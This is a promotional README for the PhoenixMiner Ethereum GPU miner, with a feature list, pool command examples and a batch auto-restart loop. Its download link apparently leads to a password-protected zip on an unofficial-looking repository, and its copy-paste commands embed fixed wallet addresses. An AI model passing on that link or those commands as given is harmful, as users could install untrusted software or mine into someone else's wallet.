 ![](https://forum.cryptoff.org/uploads/monthly_05_2018/post-6622-0-31972600-1526220545.png)

# 	PhoenixMiner: fastest Ethereum/Ethash miner with lowest devfee (Win/Linux)
<p>PhoenixMiner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
</p>
<p align="center">
<a href="https://github.com/PhoenixMiner-download/PhoenixMiner/releases/download/5.1b/PhoenixMiner_5.1b_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
<img src="https://github.com/PhoenixMiner-download/PhoenixMiner/blob/master/files/git-files/monitor.jpg?raw=true" /></a>
</p>

<p>PhoenixMiner is one of the most efficient and convenient miners to date, which is why it won the general recognition of miners.
</p>

## Table of Contents
- [Features, requirements, and limitations](#Features-requirements-and-limitations)
- [Usage](#Usage)
- [Example](#example)
- [Auto Restart](#restart)


## Features, requirements, and limitations

* Highly optimized OpenCL and CUDA cores for maximum ethash mining speed
* Official Windows / Linux support.
* Nicehash support.
* Automatic GPU configuration.
* Supports AMD Vega, 580/570/480/470, 460/560, Fury, 390/290 and older AMD GPUs with enough VRAM
* Supports Nvidia 10x0 and 9x0 series as well as older cards with enough VRAM
* Optional "green" kernels for RX580/570/560/480/470/460 to lower the power consumption by 2-3% with small, or no drop in hashrate
* Lowest developer fee of 1% (35 seconds defvee mining per each 90 minutes)
* Dual mining ðŸ’°
* Advanced statistics: actual difficulty of each share, effective hashrate at the pool, and optional showing of estimated income in USD
* DAG file generation in the GPU for faster start-up and DAG epoch switches
* Supports all ethash mining pools and stratum protocols
* Watchdog that monitors your GPU threads, if they stop hashing for a few minutes, miner restarts itself
* Startup monitor, if miner can't init GPU's and start mining in a defined time, restarts itself or runs a user defined script
* Monitoring of GPU temperature, and if a critical temperature is reached, that particular GPU is turned off until it cools down
* Set system shutdown temperature, to protect your GPU's from overheating
* API for rig monitoring


<img src="https://github.com/PhoenixMiner-download/PhoenixMiner/blob/master/files/git-files/mining.jpg?raw=true" width="866" >

  
## How to use

<li>Step 1 -  Install your GPUs and set up your computer
<li>Step 2 -  Download latest PhoenixMiner
<li>Step 3 -  Get an Ethereum wallet 
<li>Step 4 -  Join a mining pool
<li>Step 5 -  Start mining!

## Example

### Ethereum - Ethermine.org
```batch
PhoenixMiner.exe -pool eu1.ethermine.org:4444 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```

### Ethereum - sparkpool.com
```batch
PhoenixMiner.exe -pool eu.sparkpool.com:3333 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```
### Ethereum - f2pool.com
```batch
PhoenixMiner.exe -pool eth.f2pool.com:8008 -wal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
pause
```

**Note**

> Linux: Under Linux you need to replace PhoenixMiner.exe with ./PhoenixMiner in the command-line examples below.


###


###

## PhoenixMiner Auto Restart 

In Windows if you’ve  configured your miner through a batch file then you can easily make the script to loop with this simple command.
```batch
your miner configuration goes here
goto start`
```

**Example:**
```batch
:start
PhoenixMiner.exe -pool eth-eu2.nanopool.org:9999 -wal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 -coin eth
goto start
```
  
